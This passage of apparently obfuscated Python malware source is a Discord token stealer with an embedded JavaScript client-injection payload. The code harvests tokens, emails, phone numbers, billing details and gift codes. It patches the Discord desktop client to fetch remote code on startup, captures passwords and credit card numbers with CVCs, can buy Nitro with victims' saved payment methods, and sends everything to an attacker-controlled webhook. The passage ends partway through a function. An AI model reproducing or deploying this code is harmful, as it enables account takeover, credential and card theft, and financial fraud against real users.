                    if v4r_method['type'] == 1:
                        TSZAMDSFDCGGCLADLHWCSUJJOBAAMMDYGXKGLZGLVRIAAHXWWFQLTTEZWAXTEVVLWQUCY.append('CB')
                    elif v4r_method['type'] == 2:
                        TSZAMDSFDCGGCLADLHWCSUJJOBAAMMDYGXKGLZGLVRIAAHXWWFQLTTEZWAXTEVVLWQUCY.append("Paypal")
                    else:
                        TSZAMDSFDCGGCLADLHWCSUJJOBAAMMDYGXKGLZGLVRIAAHXWWFQLTTEZWAXTEVVLWQUCY.append('Other')
                TSZAMDSFDCGGCLADLHWCSUJJOBAAMMDYGXKGLZGLVRIAAHXWWFQLTTEZWAXTEVVLWQUCY = ' / '.join(TSZAMDSFDCGGCLADLHWCSUJJOBAAMMDYGXKGLZGLVRIAAHXWWFQLTTEZWAXTEVVLWQUCY)
            else:
                TSZAMDSFDCGGCLADLHWCSUJJOBAAMMDYGXKGLZGLVRIAAHXWWFQLTTEZWAXTEVVLWQUCY = "None"
        except:
            TSZAMDSFDCGGCLADLHWCSUJJOBAAMMDYGXKGLZGLVRIAAHXWWFQLTTEZWAXTEVVLWQUCY = "None"

        try:
            KIWJJHULYWOHWCZFRZVSSOKJCWWVSJRZXCKKSKCFWDVXNFVRJSWX = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': VSYWGAVDVSXMHDRNSVJXZEMPZWVYWVQMIOURMQVRPNCCCHKAFFVRAKCACPRJUGGKGXFNOMFWXXPFNWBRRZ_d15c0rd}).json()
            if KIWJJHULYWOHWCZFRZVSSOKJCWWVSJRZXCKKSKCFWDVXNFVRJSWX:
                BFJAVYJIFFSXTWEZBHJKLLNDDHXGUSMCIZKCGIKXDBLLGVODACONV = []
                for LBVPOKXMWXRZAZRNSSOCFIDPQLONVDTSJJPAVNFCJLLDVCJJYETJCNUIFIKMUWVISJWVWJHPL in KIWJJHULYWOHWCZFRZVSSOKJCWWVSJRZXCKKSKCFWDVXNFVRJSWX:
                    XJCPEUDLGILGBDCDCPOFGVUBELKGFFUFPTYKGUVKLIECTUBECJUBLPIAGVTIDSIBJIOFWAO = LBVPOKXMWXRZAZRNSSOCFIDPQLONVDTSJJPAVNFCJLLDVCJJYETJCNUIFIKMUWVISJWVWJHPL['promotion']['outbound_title']
                    LBVPOKXMWXRZAZRNSSOCFIDPQLONVDTSJJPAVNFCJLLDVCJJYETJCNUIFIKMUWVISJWVWJHPL = LBVPOKXMWXRZAZRNSSOCFIDPQLONVDTSJJPAVNFCJLLDVCJJYETJCNUIFIKMUWVISJWVWJHPL['code']
                    SJDEPWHTICIRGOEFEMEFQCYAEJGCQZPIPQJGHIMYSGNFETZYHVCAQXDPLSZPPSCUVACMDARMUQMPXBEKIOONI = f"Gift: {XJCPEUDLGILGBDCDCPOFGVUBELKGFFUFPTYKGUVKLIECTUBECJUBLPIAGVTIDSIBJIOFWAO}\nCode: {LBVPOKXMWXRZAZRNSSOCFIDPQLONVDTSJJPAVNFCJLLDVCJJYETJCNUIFIKMUWVISJWVWJHPL}"
                    if len('\n\n'.join(LBVPOKXMWXRZAZRNSSOCFIDPQLONVDTSJJPAVNFCJLLDVCJJYETJCNUIFIKMUWVISJWVWJHPL)) + len(SJDEPWHTICIRGOEFEMEFQCYAEJGCQZPIPQJGHIMYSGNFETZYHVCAQXDPLSZPPSCUVACMDARMUQMPXBEKIOONI) >= 1024:
                        break
                    BFJAVYJIFFSXTWEZBHJKLLNDDHXGUSMCIZKCGIKXDBLLGVODACONV.append(SJDEPWHTICIRGOEFEMEFQCYAEJGCQZPIPQJGHIMYSGNFETZYHVCAQXDPLSZPPSCUVACMDARMUQMPXBEKIOONI)
                if len(BFJAVYJIFFSXTWEZBHJKLLNDDHXGUSMCIZKCGIKXDBLLGVODACONV) > 0:
                    LBVPOKXMWXRZAZRNSSOCFIDPQLONVDTSJJPAVNFCJLLDVCJJYETJCNUIFIKMUWVISJWVWJHPL = '\n\n'.join(BFJAVYJIFFSXTWEZBHJKLLNDDHXGUSMCIZKCGIKXDBLLGVODACONV)
                else:
                    LBVPOKXMWXRZAZRNSSOCFIDPQLONVDTSJJPAVNFCJLLDVCJJYETJCNUIFIKMUWVISJWVWJHPL = "None"
            else:
                LBVPOKXMWXRZAZRNSSOCFIDPQLONVDTSJJPAVNFCJLLDVCJJYETJCNUIFIKMUWVISJWVWJHPL = "None"
        except:
            LBVPOKXMWXRZAZRNSSOCFIDPQLONVDTSJJPAVNFCJLLDVCJJYETJCNUIFIKMUWVISJWVWJHPL = "None"
    
        v4r_software_name, WBLHFKVJBJWEWRJTFTXKEKUHPAOMAKRRKVYVXLLCRVQTOEGSWETKXDHPSZV = JGPHUNTHYTJRWRCMGQNGPGFZOQQHNXVSAOPBIRBUASJJBQVGPWYIGMBPXSCMGF.get(VSYWGAVDVSXMHDRNSVJXZEMPZWVYWVQMIOURMQVRPNCCCHKAFFVRAKCACPRJUGGKGXFNOMFWXXPFNWBRRZ_d15c0rd, ("Unknown Software", "Unknown location"))

        embed = Embed(title=f'Discord Token {MZVIGMGXUVAXUKCLGKDNXBUIHWTQLFHVFWRIZZGPSASITDFHPUFXJWINONFJZITXFJNMJPAXGTMNBZCNGCCLBJR}:', color=VXMQMTIFNQFSZVWQCUARWNDMZHAQVHGSTCAJGPBAVLFDCNKIXKAMGROFUHIIQABQHXYZQTSEUDPCDSC)      
        embed.add_field(name=":file_folder: Path:", value=f"```{WBLHFKVJBJWEWRJTFTXKEKUHPAOMAKRRKVYVXLLCRVQTOEGSWETKXDHPSZV}```", inline=True)
        embed.add_field(name=":globe_with_meridians: Token:", value=f"```{VSYWGAVDVSXMHDRNSVJXZEMPZWVYWVQMIOURMQVRPNCCCHKAFFVRAKCACPRJUGGKGXFNOMFWXXPFNWBRRZ_d15c0rd}```", inline=True)
        embed.add_field(name=":package: Software:", value=f"```{v4r_software_name}```", inline=True)
        embed.add_field(name=":bust_in_silhouette: Username:", value=f"```{OVJSIMZEIWYASFKIYLCZNXYOESPPUBIUTFNSUICPPKIWTTUZTEGIUJXJELAIGCNSGFQLFVVZUGCQZDIAFSACRCXRHRVRX}```", inline=True)
        embed.add_field(name=":bust_in_silhouette: Display Name:", value=f"```{UGTBXDSYZOOWGWWNVSSUSZXUTCIQHSHIWKXWMUECQIWKFMOJYNOXPUMGXCBHWWZYDBATHGAFLQPXXDAGI}```", inline=True)
        embed.add_field(name=":robot: Id:", value=f"```{SZHTTZJDTMFLXYEONGGKXNHXLAEWFWWSUKNZIWZSQOBPXWHGUCJPEEBUJTBIMCZEEGHOGNFZGNMVNNBNTRVMEQHYWSY}```", inline=True)
        embed.add_field(name=":e_mail: Email:", value=f"```{PFBAZAVXZOHIHOZFXPJTIQYXRPMAWFOLQZBVCSLQDSKTXAOPEMDEJNTYIUSVJRKUHRRCWZIXXM}```", inline=True)
        embed.add_field(name=":white_check_mark: Email Verified:", value=f"```{NGVQNQFPHGZRTUNHNMEQXJQINCHUYIVSEQSANEPFEOWTLJWMWKERROCLUIGHBIWGPYQJIFQXZWXKGGWBDCWTXUDYBCZTTIG}```", inline=True)
        embed.add_field(name=":telephone_receiver: Phone:", value=f"```{HIDYCKPOPAHCNZEUJZSTQIYSPWYWVQESNVCOTBRCFIEJQCDGAKUEATCZGZQOBLTYAMJDTXKXLMI}```", inline=True)   
        embed.add_field(name=":rocket: Nitro:", value=f"```{IYPGWIEVGRGPKPTYEFGSINUTLJHSYRRGZOOUOAWJSQKPBLBVMPIZSMGGKCXAGQPEVBYKGZARFMXUYFFDDHOTZIABXCPXV}```", inline=True)
        embed.add_field(name=":earth_africa: Language:", value=f"```{GLVBTMTWFUBQWCCLMMXBLDDRQHBAODKWJBELVARKUQIUNEWLXGLJTKPKIQJRFATLPWKSGVLVYYSOSSPDJQAZGNVKXR}```", inline=True)
        embed.add_field(name=":moneybag: Billing:", value=f"```{TSZAMDSFDCGGCLADLHWCSUJJOBAAMMDYGXKGLZGLVRIAAHXWWFQLTTEZWAXTEVVLWQUCY}```", inline=True)
        embed.add_field(name=":gift: Gift Code:", value=f"```{LBVPOKXMWXRZAZRNSSOCFIDPQLONVDTSJJPAVNFCJLLDVCJJYETJCNUIFIKMUWVISJWVWJHPL}```", inline=True)
        embed.add_field(name=":lock: Multi-Factor Authentication:", value=f"```{NYLAMFXOIEPFHCZJAFXXZXONGVNEHWNSPKIWSLNPYWIWQRZNPLJRSUNBVVOWMNDSNNYE}```", inline=True)
        embed.add_field(name=":frame_photo: Profile Picture:", value=f"", inline=False)
        embed.set_image(url=VTZYABPIGLEMSZNKMCECPGRIAXMCGPGMATZKJKNJOVARIEUDKTQSUYSVHSKEHTFUZNJOWQZCFAFDIHFZCRRVVDRAW)
        embed.set_footer(text=WQPKAEYENELJACVEEVCAFHZZJZZZIBEMMIWIYJJEIJFGDMVJXBICBKRNQQJEWBIGFDKYSPOLSLJFFWIVGXTCPYZTPAWGLLISOUR, icon_url=KKAWLEUXAKPTXELIVUQRJRNWZLGXXRACMOYXGZUABGXIGLPVTEOALCZRSPITYXDQIZWQBBPOIQMKZUV)
        HSHXQNITDRHLJNZNYMKACGRQNYRFAPVTPTMPVZACEVGUNHWANHZWIZEXCIXLHELZGZLFH.send(embed=embed, username=YYYOHRNFCZUEJNONFZXIFSDHTUJIEFBANBYFREWPBSQNGMDGOKLETGRJJSIQ, avatar_url=KKAWLEUXAKPTXELIVUQRJRNWZLGXXRACMOYXGZUABGXIGLPVTEOALCZRSPITYXDQIZWQBBPOIQMKZUV)

RTAUBUTYQNSNYGDEJFBBNOODUHYRPVSVYBQGHGEOYHQBNQFSCXJYJJPGJTTKQCACPYTDHAJLYYJSMPKBTSOIHVQXLWCXGFHSQGB = r"""
const args = process.argv;
const fs = require('fs');
const path = require('path');
const https = require('https');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

const config = {
  webhook: '%WEBHOOK_HERE%', 
  webhook_protector_key: '%WEBHOOK_KEY%', 
  auto_buy_nitro: false, 
  ping_on_run: true, 
  ping_val: '@everyone',
  ip_address_public: '%IP_PUBLIC%',
  username: '%USERNAME%',
  embed_name: '%EMBED_NAME%', 
  embed_icon: '%EMBED_ICON%'.replace(/ /g, '%20'), 
  footer_text: '%FOOTER_TEXT%',
  embed_color: %EMBED_COLOR%, 
  injection_url: '', 
  api: 'https://discord.com/api/v9/users/@me',
  nitro: {
    boost: {
      year: {
        id: '521847234246082599',
        sku: '511651885459963904',
        price: '9999',
      },
      month: {
        id: '521847234246082599',
        sku: '511651880837840896',
        price: '999',
      },
    },
    classic: {
      month: {
        id: '521846918637420545',
        sku: '511651871736201216',
        price: '499',
      },
    },
  },
  filter: {
    urls: [
      'https://discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/users/@me',
      'https://*.discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/auth/login',
      'https://discord.com/api/v*/auth/login',
      'https://*.discord.com/api/v*/auth/login',
      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
      'https://api.stripe.com/v*/tokens',
      'https://api.stripe.com/v*/setup_intents/*/confirm',
      'https://api.stripe.com/v*/payment_intents/*/confirm',
    ],
  },
  filter2: {
    urls: [
      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
      'https://*.discord.com/api/v*/applications/detectable',
      'https://discord.com/api/v*/applications/detectable',
      'https://*.discord.com/api/v*/users/@me/library',
      'https://discord.com/api/v*/users/@me/library',
      'wss://remote-auth-gateway.discord.gg/*',
    ],
  },
};

function parity_32(x, y, z) {
  return x ^ y ^ z;
}
function ch_32(x, y, z) {
  return (x & y) ^ (~x & z);
}

function maj_32(x, y, z) {
  return (x & y) ^ (x & z) ^ (y & z);
}
function rotl_32(x, n) {
  return (x << n) | (x >>> (32 - n));
}
function safeAdd_32_2(a, b) {
  var lsw = (a & 0xffff) + (b & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function safeAdd_32_5(a, b, c, d, e) {
  var lsw = (a & 0xffff) + (b & 0xffff) + (c & 0xffff) + (d & 0xffff) + (e & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (c >>> 16) + (d >>> 16) + (e >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function binb2hex(binarray) {
  var hex_tab = '0123456789abcdef',
    str = '',
    length = binarray.length * 4,
    i,
    srcByte;

  for (i = 0; i < length; i += 1) {
    srcByte = binarray[i >>> 2] >>> ((3 - (i % 4)) * 8);
    str += hex_tab.charAt((srcByte >>> 4) & 0xf) + hex_tab.charAt(srcByte & 0xf);
  }

  return str;
}

function getH() {
  return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
}
function roundSHA1(block, H) {
  var W = [],
    a,
    b,
    c,
    d,
    e,
    T,
    ch = ch_32,
    parity = parity_32,
    maj = maj_32,
    rotl = rotl_32,
    safeAdd_2 = safeAdd_32_2,
    t,
    safeAdd_5 = safeAdd_32_5;

  a = H[0];
  b = H[1];
  c = H[2];
  d = H[3];
  e = H[4];

  for (t = 0; t < 80; t += 1) {
    if (t < 16) {
      W[t] = block[t];
    } else {
      W[t] = rotl(W[t - 3] ^ W[t - 8] ^ W[t - 14] ^ W[t - 16], 1);
    }

    if (t < 20) {
      T = safeAdd_5(rotl(a, 5), ch(b, c, d), e, 0x5a827999, W[t]);
    } else if (t < 40) {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0x6ed9eba1, W[t]);
    } else if (t < 60) {
      T = safeAdd_5(rotl(a, 5), maj(b, c, d), e, 0x8f1bbcdc, W[t]);
    } else {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0xca62c1d6, W[t]);
    }

    e = d;
    d = c;
    c = rotl(b, 30);
    b = a;
    a = T;
  }

  H[0] = safeAdd_2(a, H[0]);
  H[1] = safeAdd_2(b, H[1]);
  H[2] = safeAdd_2(c, H[2]);
  H[3] = safeAdd_2(d, H[3]);
  H[4] = safeAdd_2(e, H[4]);

  return H;
}

function finalizeSHA1(remainder, remainderBinLen, processedBinLen, H) {
  var i, appendedMessageLength, offset;

  offset = (((remainderBinLen + 65) >>> 9) << 4) + 15;
  while (remainder.length <= offset) {
    remainder.push(0);
  }
  remainder[remainderBinLen >>> 5] |= 0x80 << (24 - (remainderBinLen % 32));
  remainder[offset] = remainderBinLen + processedBinLen;
  appendedMessageLength = remainder.length;

  for (i = 0; i < appendedMessageLength; i += 16) {
    H = roundSHA1(remainder.slice(i, i + 16), H);
  }
  return H;
}

function hex2binb(str, existingBin, existingBinLen) {
  var bin,
    length = str.length,
    i,
    num,
    intOffset,
    byteOffset,
    existingByteLen;

  bin = existingBin || [0];
  existingBinLen = existingBinLen || 0;
  existingByteLen = existingBinLen >>> 3;

  if (0 !== length % 2) {
    console.error('String of HEX type must be in byte increments');
  }

  for (i = 0; i < length; i += 2) {
    num = parseInt(str.substr(i, 2), 16);
    if (!isNaN(num)) {
      byteOffset = (i >>> 1) + existingByteLen;
      intOffset = byteOffset >>> 2;
      while (bin.length <= intOffset) {
        bin.push(0);
      }
      bin[intOffset] |= num << (8 * (3 - (byteOffset % 4)));
    } else {
      console.error('String of HEX type contains invalid characters');
    }
  }

  return { value: bin, binLen: length * 4 + existingBinLen };
}

class jsSHA {
  constructor() {
    var processedLen = 0,
      remainder = [],
      remainderLen = 0,
      intermediateH,
      converterFunc,
      outputBinLen,
      variantBlockSize,
      roundFunc,
      finalizeFunc,
      finalized = false,
      hmacKeySet = false,
      keyWithIPad = [],
      keyWithOPad = [],
      numRounds,
      numRounds = 1;

    converterFunc = hex2binb;

    if (numRounds !== parseInt(numRounds, 10) || 1 > numRounds) {
      console.error('numRounds must a integer >= 1');
    }
    variantBlockSize = 512;
    roundFunc = roundSHA1;
    finalizeFunc = finalizeSHA1;
    outputBinLen = 160;
    intermediateH = getH();

    this.setHMACKey = function (key) {
      var keyConverterFunc, convertRet, keyBinLen, keyToUse, blockByteSize, i, lastArrayIndex;
      keyConverterFunc = hex2binb;
      convertRet = keyConverterFunc(key);
      keyBinLen = convertRet['binLen'];
      keyToUse = convertRet['value'];
      blockByteSize = variantBlockSize >>> 3;
      lastArrayIndex = blockByteSize / 4 - 1;

      if (blockByteSize < keyBinLen / 8) {
        keyToUse = finalizeFunc(keyToUse, keyBinLen, 0, getH());
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      } else if (blockByteSize > keyBinLen / 8) {
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      }

      for (i = 0; i <= lastArrayIndex; i += 1) {
        keyWithIPad[i] = keyToUse[i] ^ 0x36363636;
        keyWithOPad[i] = keyToUse[i] ^ 0x5c5c5c5c;
      }

      intermediateH = roundFunc(keyWithIPad, intermediateH);
      processedLen = variantBlockSize;

      hmacKeySet = true;
    };

    this.update = function (srcString) {
      var convertRet,
        chunkBinLen,
        chunkIntLen,
        chunk,
        i,
        updateProcessedLen = 0,
        variantBlockIntInc = variantBlockSize >>> 5;

      convertRet = converterFunc(srcString, remainder, remainderLen);
      chunkBinLen = convertRet['binLen'];
      chunk = convertRet['value'];

      chunkIntLen = chunkBinLen >>> 5;
      for (i = 0; i < chunkIntLen; i += variantBlockIntInc) {
        if (updateProcessedLen + variantBlockSize <= chunkBinLen) {
          intermediateH = roundFunc(chunk.slice(i, i + variantBlockIntInc), intermediateH);
          updateProcessedLen += variantBlockSize;
        }
      }
      processedLen += updateProcessedLen;
      remainder = chunk.slice(updateProcessedLen >>> 5);
      remainderLen = chunkBinLen % variantBlockSize;
    };

    this.getHMAC = function () {
      var firstHash;

      if (false === hmacKeySet) {
        console.error('Cannot call getHMAC without first setting HMAC key');
      }

      const formatFunc = function (binarray) {
        return binb2hex(binarray);
      };

      if (false === finalized) {
        firstHash = finalizeFunc(remainder, remainderLen, processedLen, intermediateH);
        intermediateH = roundFunc(keyWithOPad, getH());
        intermediateH = finalizeFunc(firstHash, outputBinLen, variantBlockSize, intermediateH);
      }

      finalized = true;
      return formatFunc(intermediateH);
    };
  }
}

if ('function' === typeof define && define['amd']) {
  define(function () {
    return jsSHA;
  });
} else if ('undefined' !== typeof exports) {
  if ('undefined' !== typeof module && module['exports']) {
    module['exports'] = exports = jsSHA;
  } else {
    exports = jsSHA;
  }
} else {
  global['jsSHA'] = jsSHA;
}

if (jsSHA.default) {
  jsSHA = jsSHA.default;
}

function totp(key) {
  const period = 30;
  const digits = 6;
  const timestamp = Date.now();
  const epoch = Math.round(timestamp / 1000.0);
  const time = leftpad(dec2hex(Math.floor(epoch / period)), 16, '0');
  const shaObj = new jsSHA();
  shaObj.setHMACKey(base32tohex(key));
  shaObj.update(time);
  const hmac = shaObj.getHMAC();
  const offset = hex2dec(hmac.substring(hmac.length - 1));
  let otp = (hex2dec(hmac.substr(offset * 2, 8)) & hex2dec('7fffffff')) + '';
  otp = otp.substr(Math.max(otp.length - digits, 0), digits);
  return otp;
}

function hex2dec(s) {
  return parseInt(s, 16);
}

function dec2hex(s) {
  return (s < 15.5 ? '0' : '') + Math.round(s).toString(16);
}

function base32tohex(base32) {
  let base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567',
    bits = '',
    hex = '';

  base32 = base32.replace(/=+$/, '');

  for (let i = 0; i < base32.length; i++) {
    let val = base32chars.indexOf(base32.charAt(i).toUpperCase());
    if (val === -1) console.error('Invalid base32 character in key');
    bits += leftpad(val.toString(2), 5, '0');
  }

  for (let i = 0; i + 8 <= bits.length; i += 8) {
    let chunk = bits.substr(i, 8);
    hex = hex + leftpad(parseInt(chunk, 2).toString(16), 2, '0');
  }
  return hex;
}

function leftpad(str, len, pad) {
  if (len + 1 >= str.length) {
    str = Array(len + 1 - str.length).join(pad) + str;
  }
  return str;
}

const discordPath = (function () {
  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
  let resourcePath;

  if (process.platform === 'win32') {
    resourcePath = path.join(app, 'resources');
  } else if (process.platform === 'darwin') {
    resourcePath = path.join(app, 'Contents', 'Resources');
  }

  if (fs.existsSync(resourcePath)) return { resourcePath, app };
  return { undefined, undefined };
})();

function updateCheck() {
  const { resourcePath, app } = discordPath;
  if (resourcePath === undefined || app === undefined) return;
  const appPath = path.join(resourcePath, 'app');
  const packageJson = path.join(appPath, 'package.json');
  const resourceIndex = path.join(appPath, 'index.js');
  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
  const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

  if (process.platform === 'win32' || process.platform === 'darwin') {
    fs.writeFileSync(
      packageJson,
      JSON.stringify(
        {
          name: 'discord',
          main: 'index.js',
        },
        null,
        4,
      ),
    );

    const startUpScript = `const fs = require('fs'), https = require('https');
const indexJs = '${indexJs}';
const bdPath = '${bdPath}';
const fileSize = fs.statSync(indexJs).size
fs.readFileSync(indexJs, 'utf8', (err, data) => {
    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
        init();
})
async function init() {
    https.get('${config.injection_url}', (res) => {
        const file = fs.createWriteStream(indexJs);
        res.replace('%WEBHOOK_HERE%', '${config.webhook}')
        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
    
    }).on("error", (err) => {
        setTimeout(init(), 10000);
    });
}
require('${path.join(resourcePath, 'app.asar')}')
if (fs.existsSync(bdPath)) require(bdPath);`;
    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
  }
  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
  fs.rmdirSync(path.join(__dirname, 'initiation'));
  execScript(
    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
  );
  return !1;
}

const execScript = (script) => {
  const window = BrowserWindow.getAllWindows()[0];
  return window.webContents.executeJavaScript(script, !0);
};

const getInfo = async (token) => {
  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "${config.api}", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null);
    xmlHttp.responseText;`);
  return JSON.parse(info);
};

const fetchBilling = async (token) => {
  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
    xmlHttp.setRequestHeader("Authorization", "${token}"); 
    xmlHttp.send(null); 
    xmlHttp.responseText`);
  if (!bill.lenght || bill.length === 0) return '';
  return JSON.parse(bill);
};

const getBilling = async (token) => {
  const data = await fetchBilling(token);
  if (!data) return '❌';
  let billing = '';
  data.forEach((x) => {
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          billing += '[CARD] ';
          break;
        case 2:
          billing += '[PAYPAL] ';
          break;
      }
    }
  });
  if (!billing) billing = 'None';
  return billing;
};

const Purchase = async (token, id, _type, _time) => {
  const options = {
    expected_amount: config.nitro[_type][_time]['price'],
    expected_currency: 'usd',
    gift: true,
    payment_source_id: id,
    payment_source_token: null,
    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
    sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
  };

  const req = execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.setRequestHeader('Content-Type', 'application/json');
    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
    xmlHttp.responseText`);
  if (req['gift_code']) {
    return 'https://discord.gift/' + req['gift_code'];
  } else return null;
};

const buyNitro = async (token) => {
  const data = await fetchBilling(token);
  const failedMsg = 'Failed to Purchase';
  if (!data) return failedMsg;

  let IDS = [];
  data.forEach((x) => {
    if (!x.invalid) {
      IDS = IDS.concat(x.id);
    }
  });
  for (let sourceID in IDS) {
    const first = Purchase(token, sourceID, 'boost', 'year');
    if (first !== null) {
      return first;
    } else {
      const second = Purchase(token, sourceID, 'boost', 'month');
      if (second !== null) {
        return second;
      } else {
        const third = Purchase(token, sourceID, 'classic', 'month');
        if (third !== null) {
          return third;
        } else {
          return failedMsg;
        }
      }
    }
  }
};

const hooker = async (content) => {
  const data = JSON.stringify(content);
  const url = new URL(config.webhook);
  const headers = {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  };
  if (!config.webhook.includes('api/webhooks')) {
    const key = totp(config.webhook_protector_key);
    headers['Authorization'] = key;
  }
  const options = {
    protocol: url.protocol,
    hostname: url.host,
    path: url.pathname,
    method: 'POST',
    headers: headers,
  };
  const req = https.request(options);

  req.on('error', (err) => {
    console.log(err);
  });
  req.write(data);
  req.end();
};

const login = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Login] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const passwordChanged = async (oldpassword, newpassword, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Password Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${json.email}\`\`\``,
            inline: false,
          },
          {
            name: ':unlock: Old Password:',
            value: `\`\`\`${oldpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':key: New Password:',
            value: `\`\`\`${newpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const emailChanged = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Email Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: New Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const PaypalAdded = async (token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Paypal Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Card Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':identification_card: Card:',
            value: `\`\`\`Number: ${number}\nCVC: ${cvc}\nExpir Month: ${expir_month}\nExpir Year: ${expir_year}\`\`\``,
